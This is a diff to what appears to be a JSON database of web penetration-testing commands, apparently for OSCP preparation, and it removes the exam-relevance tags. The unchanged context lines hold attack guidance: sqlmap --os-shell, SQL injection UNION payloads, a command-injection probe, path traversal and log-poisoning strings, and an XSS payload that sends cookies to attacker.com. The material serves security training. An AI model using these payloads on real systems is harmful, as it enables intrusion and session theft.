@@ -15,7 +15,6 @@
         "ENUMERATION",
         "GOBUSTER",
         "NOISY",
-        "OSCP:HIGH",
         "QUICK_WIN",
         "STARTER",
         "WEB"
@@ -74,7 +73,6 @@
       ],
       "prerequisites": [],
       "notes": "Adjust extensions based on technology stack",
-      "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "Investigate found directories: curl <URL>/<FOUND_DIR> Scan subdirectories: gobuster dir -u <URL>/<DIR> -w <WORDLIST> Try authenticated scan if 401/403: gobuster dir -u <URL> -w <WORDLIST> -c 'Cookie: session=<SESSION_TOKEN>' Check for backup files: gobuster dir -u <URL> -w <WORDLIST> -x bak,old,~"
       },
@@ -91,7 +89,6 @@
         "ENUMERATION",
         "NIKTO",
         "NOISY",
-        "OSCP:MEDIUM",
         "STARTER",
         "VULN",
         "WEB"
@@ -129,7 +126,6 @@
       "next_steps": [],
       "alternatives": [],
       "notes": "Can be slow but thorough",
-      "oscp_relevance": "medium",
       "methodology_guidance": {
         "after_success": "Research found OSVDB IDs: searchsploit OSVDB-<ID> Test specific vulnerabilities found Check server version for exploits: searchsploit <server> <version>",
         "manual_alternative": "Manually verify findings: curl -I <URL>"
@@ -149,7 +145,6 @@
         "EXPLOITATION",
         "INJECTION",
         "NOISY",
-        "OSCP:HIGH",
         "SQLI",
         "SQLMAP",
         "SQL_INJECTION",
@@ -208,7 +203,6 @@
         "sqli-manual-test"
       ],
       "notes": "Save Burp request to file for complex requests",
-      "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "Enumerate databases: sqlmap -u '<URL>' --dbs Dump specific database: sqlmap -u '<URL>' -D <DATABASE> --dump Get shell: sqlmap -u '<URL>' --os-shell Try different techniques: sqlmap -u '<URL>' --technique=U"
       },
@@ -225,7 +219,6 @@
         "EXPLOITATION",
         "INJECTION",
         "MANUAL",
-        "OSCP:HIGH",
         "QUICK_WIN",
         "SQLI",
         "SQL_INJECTION",
@@ -257,7 +250,6 @@
       ],
       "prerequisites": [],
       "notes": "Try with both single and double quotes",
-      "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "Try UNION SELECT: ' UNION SELECT null,null,null-- Extract database version: ' UNION SELECT @@version,null,null-- Enumerate tables: ' UNION SELECT table_name,null FROM information_schema.tables-- Use sqlmap for automation: sqlmap -u '<URL>?param=value' admin'--"
       }
@@ -274,7 +266,6 @@
         "ENUM",
         "ENUMERATION",
         "FUZZ",
-        "OSCP:MEDIUM",
         "WEB",
         "WFUZZ"
       ],
@@ -314,7 +305,6 @@
         "burp-intruder"
       ],
       "notes": "Filter by response size or status code",
-      "oscp_relevance": "medium",
       "methodology_guidance": {
         "after_success": "Test found parameters for injection: <URL>?<PARAM>=' Fuzz parameter values: wfuzz -z file,<WORDLIST> '<URL>?param=FUZZ' Check for IDOR: <URL>?<PARAM>=1,2,3... Test for command injection: <URL>?<PARAM>=;id"
       },
@@ -330,7 +320,6 @@
         "CROSS_SITE_SCRIPTING",
         "EXPLOITATION",
         "MANUAL",
-        "OSCP:MEDIUM",
         "WEB",
         "XSS"
       ],
@@ -354,7 +343,6 @@
       "next_steps": [],
       "alternatives": [],
       "notes": "Check if input is reflected in response\n\nAlternative Techniques:\n- \"><script>alert(1)</script>",
-      "oscp_relevance": "medium",
       "methodology_guidance": {
         "after_success": "Try event handlers: <img src=x onerror=alert(1)> Bypass filters: <ScRiPt>alert(1)</ScRiPt> Steal cookies: <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script> Check stored XSS in forms/comments"
       }
@@ -370,7 +358,6 @@
         "FILE_INCLUSION",
         "LFI",
         "MANUAL",
-        "OSCP:HIGH",
         "WEB"
       ],
       "variables": [],
@@ -399,7 +386,6 @@
         "gobuster-dir"
       ],
       "notes": "Try with null byte (%00) termination\n\nAlternative Techniques:\n- ....//....//etc/passwd\n- ..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n- file:///etc/passwd",
-      "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "Read web config: ../../../../var/www/html/config.php Get shell via log poisoning: ../../../var/log/apache2/access.log Windows LFI: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts PHP filter wrapper: php://filter/convert.base64-encode/resource=index.php %252e%252e%252f"
       }
@@ -455,7 +441,6 @@
       "next_steps": [],
       "alternatives": [],
       "notes": "Use -H for custom headers",
-      "oscp_relevance": "medium",
       "methodology_guidance": {
         "after_success": "Add headers: curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"value\"}' <URL> Save cookies: curl -c cookies.txt -X POST -d 'user=admin' <URL> Use cookies: curl -b cookies.txt <URL> Follow redirects: curl -L -X POST -d 'data' <URL>"
       },
@@ -471,7 +456,6 @@
         "ENUM",
         "ENUMERATION",
         "FAST",
-        "OSCP:HIGH",
         "WEB",
         "WHATWEB"
       ],
@@ -508,7 +492,6 @@
       ],
       "prerequisites": [],
       "notes": "Essential for finding version-specific exploits",
-      "oscp_relevance": "high",
       "methodology_guidance": {
         "after_success": "Search for version exploits: searchsploit <technology> <version> Check default credentials for identified CMS Look for technology-specific vulnerabilities Adjust wordlists based on technology (PHP, ASP, JSP)"
       },
